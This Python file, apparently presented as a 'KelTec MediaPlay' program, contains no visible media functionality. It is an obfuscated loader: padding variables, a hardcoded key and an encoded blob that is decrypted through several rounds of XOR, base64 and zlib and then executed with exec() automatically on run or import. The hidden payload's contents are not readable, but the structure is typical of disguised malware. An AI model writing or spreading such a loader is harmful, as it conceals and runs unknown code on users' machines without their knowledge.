# -*- coding: utf-8 -*-
# KelTec MediaPlay

_lx0_0 = 482488 ^ 117642
_lx1_1 = len("99d5a5")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-295659)
_lx3_3 = 314440 * 0
_lx4_4 = 348623 ^ 653400
_K = 'f11d32ae784506f70d408bfbff10e1a5eccd274843dc912da0d42e9999863c80'
_M = 'iRQXp0FkHICg8LyDkAIS43EMBy0BWgEJ2v6/8DeEmwPZVV+5DHccz6P944CZAUe0dAYEe1VQUwWF/rLxPtDPVo9bX+oAdEzM+PXk'
_D = 'QLDlMfRS2hMyDgDQjzOgvCLih3kG+pmXpWiZ5ZhJp9RvVA/Nmt6I7BbV+wbeWoCnz9oCrenZa+WkYypJDoccbomWWUf5SLzJjbQ7EoWteDeY+esoAzv9sQbUyo6G5HL+TdJwenG96pHxhCHlIbhvDuxgmxaLQ0eYScg9A94h1EErZhv7TxFITzM8ELl/1IO0S5lF56fSmcrmB7i+rUJdNP+cxd7UvuYv7jqa9FdUsGMMNus+/6BJwOChbJqZyHEB8P0FIUvTwArVZpyhkdGCPLJeZqMh2Tmx+3MQXIVmBu044uGsDU6L3Lho+2rchkem1gbkjJWBTK+jbtz0WyCqj6Rksx3W9ri9T5Hvtka0Nm+znCXJpseL4mwtfU6D5HybTHlk2aJPF5ahRqlJ0ZWxHYn4xAVkxFfGX+H6XWi741xG8OtvW2Tz3EeirhJbOvXugYvYRkGdGfAjRlB5Sf7o0AVsAiOXqCzDm8an+8zB9T2IfgQfHNCYDmk2r/+L+VetHgvxXDT7OoN3LRFWKwQ2b5NkvNFW5BUtWOO1vpNq9Rl+09pUfYgZG+uURbk4iBjewh1jRZ7Lv1FKWSNWyDg6sxnkEOpZ6vO9oXCIu7ETbphCtSfYHiXKeZcFDuuEvd3VhUHikFnO/+a+vYT6Kri/7rUjM18ZUWBW1mIIV9etXc1tkEaycgkq57mP9rS2KH+P8NgJ9z8iPztjZ2Yc83afwFgqB630GCEjtDGyG0oNGLDfMfxxECia7LhfVnyl9ClC0alaF2o4Px28duGWP//7g5fWbJpwoZEvIxNF05qccsKFtJIR6Kf4juaKi2NnMLXYsQOApH+1M4U6wigxY2DaJQFa3XkHwd7ZVXQYppYSe/zFFokvait505elypkKIM0lXLfAEoWSDi89EATjzegrnbyYyJ8xhiFcw0nCTEq9PN2WhpFVrFVFJrHC0MbFAiUFHDhCrcEidsWGYmX3vR5DWqOKXWNITQ5rnQoebPLTV3vAUIhsfzCFtvZuTJEiBPNiGFeh6PYkLkXWIbdo5peVNuQ0lvku684xUjMbVlBW80acAlEo4kQOFWZSoMvcqM/xJAtsSj7VgRMvc7qkyXFfbHFyjvO01D+YyzQQOFfcRIarLcUBJrkSeQU9rTHRLFdFJBE7Q60H9AN29bq5CR7xy7z/rA0OKLzvxQRPhb4kP7ftB9cdF7uvrrBSVXIosMnJ5exaRvwhPRMYisgp2xGenwwvhrNklImE/NZRa7qpEi0OVvkuz6O0mHoULmVCa0G533Co1dkoNcijRzvJ+mmzOCq3uht5Q+okkS8JHQC4vvzSrIgZOYvpjTVRJMRw2gmd83ebimUxkNrNJCU18yaeHxE1bPyt1VxmvF78Q3FqJsXizD5ykNiSh0DE4yIfKO27xUBqI3fOdWFbowis2P9r+/Z9PhrmwrXkZY5g7p4rW4kpaO66psgvRk10yTAtLa2P1xsGq9YpzbMksabvCW9u3PU0tvLHMp6yfIOCydkVfVYjRVxNjcn/3DSIrShaQ+plsht3HwPXu1MHnJXdelYgPVExj/BVd/nPaPUdrYBK/Si+kRzH7LCmmtNAJmIFvlZDyw8THBL+Ixdr3QYaiHjqWESztuZmJrBhmezPq4GRxuCSf7z/sjq4mF/ejon5bCJ2MIxvlmf0ZPOwYBEYP0HTdBrFFXql/JDLsDHftAesVSNUF2bsnX67woPziAjm+Vz46MFkgnntSp5UHncggqifVF5BllYJW3P6KuciCk6YBMd3snsZ'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()